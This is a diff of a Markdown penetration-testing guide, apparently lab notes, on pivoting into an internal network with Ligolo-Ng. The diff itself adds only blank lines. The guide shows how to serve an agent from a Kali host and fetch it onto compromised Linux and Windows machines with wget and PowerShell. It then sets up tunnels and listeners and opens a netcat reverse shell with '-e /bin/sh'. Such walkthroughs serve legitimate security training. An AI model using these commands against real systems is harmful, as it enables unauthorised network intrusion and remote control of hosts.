@@ -23,6 +23,7 @@ For more information about Ligolo-Ng, visit its official [GitHub Repository](htt
 # Alternative with Package Installer
 ```shell
 sudo apt install ligolo-ng
+
 # Locate, copy the needed files and run them (Example with agent file)
 sudo updatedb -v
 locate agent
@@ -37,9 +38,11 @@ Move the agent file into the pivot host:
 # On Kali
 sudo cp /home/kali/Downloads/ligolo-ng_agent_0.7.2_linux_amd64/agent .
 python3 -m http.server 443
+
 # On Target (Linux)
 cd /tmp
 wget http://<kali_ip>:443/agent
+
 # On Target (Windows using PowerShell)
 cd C:\Windows\Temp
 powershell -c iwr http://<kali_ip>:443/agent.exe -OutFile agent.exe
@@ -49,12 +52,15 @@ Set up Ligolo-Ng on Kali:
 # Create an interface
 sudo ip tuntap add user Vorkharium mode tun ligolo
 sudo ip link set ligolo up
+
 # Add new IP range we want to access (Examine Pivot Host with ifconfig, ip a, etc commands)
 sudo ip route add 172.16.150.0/24 dev ligolo
 ip route list
+
 # Run the proxy file
 sudo chmod +x proxy
 ./proxy -selfcert
+
 # The Ligolo-Ng console will now open (We will interact with it soon)
 ```
 
@@ -63,18 +69,23 @@ On the Pivot target, use the agent file to connect to our running proxy:
 # On Linux
 chmod +x agent
 ./agent --connect <kali_ip>:11601 -ignore-cert
+
 # On Windows PowerShell
 ./agent.exe --connect <kali_ip>:11601 -ignore-cert
+
 ```
 
 Now enter the following on the Ligolo-Ng console:
 ```shell
 # Enter "session" to show the available sessions
 ligolo-ng » session
+
 # Enter "1" to select the session we created when using the agent (There is only one session to choose in this case)
 ? Specify a session : 1
+
 # Enter "start" to start the connection
 [Agent : hackme@compromisedmachine] » start
+
 # Now we are able to access the network 172.16.150.0/24
 ```
 
@@ -89,8 +100,10 @@ To achieve that, we will create a new listener in our active Ligolo-Ng session:
 # Create new listener - Port 1234 on Kali will be the Port 9001 on the Pivot Host A
 # Enter the following on the running active Kali Ligolo-Ng session
 listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:9001
+
 # Start Python server on Kali using Port 1234
 python3 -m http.server 1234
+
 # From the Host B CLI, access Python server through Port 9003 at the Pivot Host
 wget http://172.16.150.10:9001/test.txt
 ```
@@ -101,9 +114,12 @@ Following the example above, we will create a new listener, but this time we wil
 # Create new listener - Port 1235 on Kali will be the Port 9002 on the Pivot Host A
 # Enter the following on the running active Kali Ligolo-Ng session
 listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:9002
+
 # Start nc listener on Kali Port 1235
 nc -lvnp 1235
+
 # Enter the following at Linux CLI on Host B to access the nc listener through Pivot Host A Port 9002
 nc 172.16.150.10 9002 -e /bin/sh
+
 # Now we successfully got a shell from the Host B (172.16.50.20) to our Kali
 ```
